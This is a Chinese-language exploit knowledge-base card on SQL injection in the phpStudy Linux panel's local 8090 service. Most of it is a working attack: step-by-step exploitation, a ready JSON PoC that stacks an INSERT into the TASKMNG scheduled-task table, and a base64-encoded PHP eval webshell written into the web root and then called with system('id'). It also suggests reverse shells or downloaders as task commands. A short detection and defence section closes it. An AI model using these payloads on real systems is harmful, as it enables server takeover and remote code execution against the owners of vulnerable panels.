---
id: web-generic-sqli-phpstudy-linux-panel-socket-login-taskmng-webshell
title: phpStudy Linux 面板 8090 本地服务登录 SQL 注入：username 堆叠 INSERT INTO TASKMNG 建计划任务写 PHP Webshell
type: scenario
domain: web
path: web/generic/sqli
technique: phpstudy-linux-panel-socket-login-sqli-taskmng-webshell
tags:
- phpstudy
- php
- sqli
- stacked-query
- scheduled-task
- webshell
- socket
- panel
- linux
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V336
  verified_at: '2026-11-08T18:46:33+08:00'
  notes: 已对照原文与 12 张图核对：xp 面板 404 指纹、account.php→Socket→127.0.0.1:8090 协议与 ^^^ 结束符、IDA 中 TASKMNG/ACCEPTPORT 等 SQL 字符串、nc 同连接双请求均与卡一致；文件管理截图 b.php 29B 与 base64 载荷解码（<?php eval($_REQUEST[1]);;?>\n，29 字节）吻合，直连注入→计划任务→写文件链有截图佐证。原文 Web SSRF 投递链作者自述未打通，卡内已明确排除、仅覆盖已能访问 8090 的前提，处理正确。原文未给面板版本，affected_versions 已清空。dedup 仅自匹配，唯一 related 为 SQLite ATTACH 卡，sink/数据库不同，非重复。
url: /docs/web/generic/sqli/web-generic-sqli-phpstudy-linux-panel-socket-login-taskmng-webshell/
draft: false
kb_aliases:
- phpStudy SQL 注入
- 小皮面板 SQL 注入
- phpstudy 8090 注入
- TASKMNG 计划任务
- phpStudy 计划任务写 shell
- panel socket login sqli
---

## 一句话结论

phpStudy Linux 面板的 Web 前端把登录请求打包成 JSON，通过 `127.0.0.1:8090` 发给本地 C++ 主服务；主服务把 `username` 直接拼进 SQL。攻击者在 `username` 中堆叠 `INSERT INTO TASKMNG(...)` 创建一条计划任务，任务执行 `echo <base64> | base64 -d > /www/admin/localhost_80/wwwroot/shell.php`，即可把 PHP Webshell 写入默认网站根目录。

## 原理

- **面板通信链路**：Web 端 `account.php` 的 `type=login` 分支读取 `username`/`password`/`verifycode`，只对 username 做 `htmlspecialchars`（HTML 实体编码，不转义 SQL 引号），然后交给 `Account::login`；`Account::login` 把登录数据 `json_encode` 成 `{"command":"login","data":{"username":...,"pwd":...}}`，交给 `Socket::request`；`Socket` 连接 `127.0.0.1:8090`，在 JSON 末尾追加自定义结束符 `^^^` 后 `socket_write`，再循环读到 `^^^` 为止。
- **为什么可以堆叠**：C++ 主服务把 `username` 拼进登录 SQL，且底层 MySQL 客户端允许一次执行多条语句；username 中的 `'` 先闭合原字符串，`;` 结束原语句，随后 `INSERT INTO TASKMNG(...)` 作为第二条语句执行，末尾 `--` 注释掉原 SQL 剩余部分。`htmlspecialchars` 不会把 `'` 转成 SQL 安全的转义，因此不构成防护。
- **TASKMNG 计划任务表**：程序包含 `TASKMNG` 相关 SELECT/INSERT 逻辑（IDA strings 可见 `SELECT ID,TITLE,TYPE,CYCLE,TIME,ADDTIME,SHELL,... FROM TASKMNG`），其中 `SHELL` 字段保存要执行的命令，`CYCLE`/`TIME` 控制周期。插入一条 `CYCLE='N分钟'`、`TIME='1'` 的任务后，主服务会按计划执行 SHELL 字段。
- **写 Webshell**：SHELL 字段设为 `echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOzs/Pgo=|base64 -d > /www/admin/localhost_80/wwwroot/shell.php`。base64 解码为 `<?php eval($_REQUEST[1]);?>`；`/www/admin/localhost_80/wwwroot` 是默认站点根目录，写入后访问对应 URL 并传 `1=system('id')` 即可执行命令。
- **为什么能成功**：面板默认以较高权限运行，任务执行命令时对站点根目录有写权限；任务表是应用自身功能，执行链路不经过文件上传校验或扩展名过滤，因此不受 JSP/PHP 上传限制影响。
- **可达性边界**：8090 只监听本地回环，正常只能由同机 Web 前端或本地用户访问。原文尝试从 Web 端的盲 SSRF（`file_get_contents` + 可控 `url`/`header`）投递到 8090，但作者明确表示在本地和在线靶机都未能打通；本卡只覆盖“已能访问 127.0.0.1:8090”这一前提下的 SQL 注入→计划任务→写文件链，不把未验证的 SSRF 投递算作已复现。

## 触发条件

- 目标运行 phpStudy Linux 面板，且 8090 本地主服务可访问（本地 shell、同机 SSRF、端口转发等）。
- 攻击者能与 8090 建立 TCP 连接并按 `^^^` 结束符发送 JSON；登录命令不需要真实密码即可进入 SQL 拼接（原文用 `admin' or 1=1 -- ` 及堆叠 INSERT 测试）。
- 主服务使用的 MySQL 账号对 `TASKMNG` 表有 INSERT 权限，且允许堆叠语句。
- 面板以可写默认站点根目录（如 `/www/admin/localhost_80/wwwroot`）的权限运行计划任务。
- 目标未对 `TASKMNG` 插入、计划任务创建或站点根目录文件变化做监控。

## 利用步骤

1. 连接 8090：`nc 127.0.0.1 8090`。
2. 先发送正常登录 JSON 确认协议与结束符：

```json
{"command":"login","data":{"username":"admin","pwd":"12345678"}}^^^
```

3. 发送堆叠注入，创建计划任务：

```json
{"command":"login","data":{"username":"admin';INSERT INTO TASKMNG (TITLE,TYPE,CYCLE,TIME,ADDTIME,SHELL,SITES,UID,PCS,TASK_TYPE,DBS,ACTION) VALUES('1',1,'N分钟','1','4','echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOzs/Pgo=|base64 -d > /www/admin/localhost_80/wwwroot/shell.php','6',1,1,0,'7','8');--","pwd":"123456"}}^^^
```

4. 回到面板计划任务/文件管理确认：原文文件管理显示 `/www/admin/localhost_80/wwwroot` 下新增 `b.php`（29B），说明任务已执行并写入文件。
5. 访问 `http://<target>/shell.php`，以 `1=system('id')` 等参数验证 Webshell。
6. 清理：删除 `TASKMNG` 中的任务记录、删除站点根目录 webshell；计划任务可能按周期继续执行，需同时停止/删除任务。

## PoC

原文已验证的 8090 直连 payload（未在本机复现）：

```json
{"command":"login","data":{"username":"admin';INSERT INTO TASKMNG (TITLE,TYPE,CYCLE,TIME,ADDTIME,SHELL,SITES,UID,PCS,TASK_TYPE,DBS,ACTION)   VALUES('1',1,'N分钟','1','4','echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOzs/Pgo=|base64 -d > /www/admin/localhost_80/wwwroot/shell.php','6',1,1,0,'7','8');--","pwd":"123456"}}^^^
```

base64 载荷 `PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOzs/Pgo=` 解码为：

```php
<?php eval($_REQUEST[1]);?>
```

原文的 Web SSRF 投递 payload（`url=http://127.0.0.1:8090/_^^^{...}^^^&header=...`）**未打通**，作者自述本地和在线靶机都无法正常解题；本卡不将其作为已复现步骤。

## 变体与关联

- **INTO OUTFILE 变体**：若 MySQL 账号有 FILE 权限且 secure_file_priv 允许，可直接用 `SELECT ... INTO OUTFILE` 写 webshell，见 `web-generic-sqli-360webscan-stacked-outfile-webshell` 等卡；本卡是在不能/不便写文件时滥用应用自身的计划任务表。
- **命令执行而非写文件**：TASKMNG 的 SHELL 字段可直接填反弹 shell、下载器或其他命令，计划任务会周期性执行；写 PHP 文件只是其中一种落点。
- **其他面板/任务表**：同类面板若把用户输入拼进 SQL 且有“任务/计划/命令”表，均可套用“堆叠插入任务→执行命令”的思路；关键是找到会被后台调度执行的命令字段。
- **协议细节**：8090 用 `^^^` 作为消息结束符，且原文演示同一连接可连续发送两条 JSON 并收到两条响应；构造 payload 时需保证结束符位置正确，否则服务端会一直等待/拼接。
- **SSRF 投递**：原文的盲 SSRF（PHP `file_get_contents` + 可控 `header`）是另一条未完成的链；若要复用，需要解决请求行/请求体/`^^^` 结束符的精确构造问题，不能直接照搬原文 payload。

## 检测与防御

- **主机/网络**：监控对 `127.0.0.1:8090` 的非面板进程连接；限制本地回环服务的访问者，使用 Unix socket/鉴权；对 8090 的异常 JSON（含 `INSERT`、`TASKMNG`、`;--`、`^^^`）做审计。
- **数据库**：对 `TASKMNG` 的 INSERT 做来源与频率审计；面板数据库账号最小权限，禁止堆叠语句（如驱动层 `allowMultiQueries=false`）。
- **文件完整性**：监控 `/www/admin/localhost_80/wwwroot` 等站点根目录新增/修改的 `.php` 文件；对计划任务执行产生的文件写入告警。
- **面板安全**：升级 phpStudy 面板到修复版本；修改默认端口/绑定；不要把面板 8090 暴露到公网；禁用不需要的计划任务功能；对登录接口 username 做参数化查询/严格白名单。
- **Web 入口**：审查 PHP 端 `file_get_contents` + 用户可控 `url`/`header` 的 SSRF；限制协议与目标地址，禁止 CRLF 进入 header；对出网请求做目标白名单。
